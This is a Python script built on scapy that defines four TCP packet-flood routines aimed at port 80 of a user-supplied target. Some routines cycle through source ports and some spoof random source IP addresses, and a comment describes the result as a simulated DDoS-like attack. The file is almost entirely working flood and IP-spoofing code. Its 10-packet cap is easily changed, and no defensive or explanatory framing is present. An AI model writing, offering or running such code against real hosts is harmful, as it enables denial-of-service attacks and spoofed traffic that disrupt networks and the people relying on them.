import random
from scapy.all import IP, TCP, send

i = 1  # Initialize packet counter

# Single IP Source Port Flood
#  Sends a stream of TCP packets from the user-specified source IP to the target IP, 
# using the specified source port and destination port 80 (standard for HTTP).
def SISP():
    source_IP = input("Enter IP address of Source: ")
    target_IP = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))
    global i  # Use the global counter i
    packet_count = 0  # Initialize packet counter
    while packet_count < 10:
        # Create IP and TCP layers
        IP1 = IP(src=source_IP, dst=target_IP)  # Use 'src' for source IP
        TCP1 = TCP(sport=source_port, dport=80)  # Use 'sport' for source port
        pkt = IP1 / TCP1  # Combine IP and TCP layers into a packet

        # Send packet
        send(pkt, inter=0.001)  # Send packet with 0.001 second interval
        print(f"Packet sent {i}")
        i += 1  # Increment packet counter
        packet_count += 1  # Increment the total sent packet count

# Single IP Source Ports Flood
# Sends packets from the user-specified source IP to the target IP,
# but this time it cycles through all possible source port numbers (from 1 to 65534).
def SIMP():
    source_IP = input("Enter IP address of Source: ")
    target_IP = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))
    global i  # Use the global counter i
    packet_count = 0  # Initialize packet counter
    while packet_count < 10:
        for source_port in range(1, 65535):
            # Create IP and TCP layers
            IP1 = IP(src=source_IP, dst=target_IP)
            TCP1 = TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1  # Combine IP and TCP layers into a packet

            # Send packet
            send(pkt, inter=0.001)  # Send packet with 0.001 second interval
            print(f"Packet sent {i}")
            i += 1  # Increment packet counter
            packet_count += 1  # Increment the total sent packet count
            if packet_count >= 10:
                break  # Exit the loop if 10 packets are sent

# Multiple Random Source IPs Flood
# Sends packets using random source IPs (within the range 1.1.1.1 to 254.254.254.254) to the target IP. 
# This simulates a distributed source (DDoS-like) attack where many different IPs flood the target.
def MISP():
    source_IP = input("Enter IP address of Source: ")
    target_IP = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))
    global i  # Use the global counter i
    packet_count = 0  # Initialize packet counter
    while packet_count < 10:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))
        source_ip = a + "." + b + "." + c + "." + d  # Randomize source IP

        IP1 = IP(src=source_ip, dst=target_IP)  # Use randomized source IP
        TCP1 = TCP(sport=source_port, dport=80)
        pkt = IP1 / TCP1  # Combine IP and TCP layers into a packet

        # Send packet
        send(pkt, inter=0.001)  # Send packet with 0.001 second interval
        print(f"Packet sent {i}")
        i += 1  # Increment packet counter
        packet_count += 1  # Increment the total sent packet count

# Multiple Random Source IPs and Source Ports Flood
#  This combines both random source IPs and cycling through all possible source port numbers (from 1 to 65534), 
# sending packets to the target IP.
def MIMP():
    source_IP = input("Enter IP address of Source: ")
    target_IP = input("Enter IP address of Target: ")
    source_port = int(input("Enter Source Port Number:"))
    global i  # Use the global counter i
    packet_count = 0  # Initialize packet counter
    while packet_count < 10:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))
        source_ip = a + "." + b + "." + c + "." + d  # Randomize source IP

        for source_port in range(1, 65535):
            # Create IP and TCP layers
            IP1 = IP(src=source_ip, dst=target_IP)
            TCP1 = TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1  # Combine IP and TCP layers into a packet

            # Send packet
            send(pkt, inter=0.001)  # Send packet with 0.001 second interval
            print(f"Packet sent {i}")
            i += 1  # Increment packet counter
            packet_count += 1  # Increment the total sent packet count
            if packet_count >= 10:
                break  # Exit the loop if 10 packets are sent
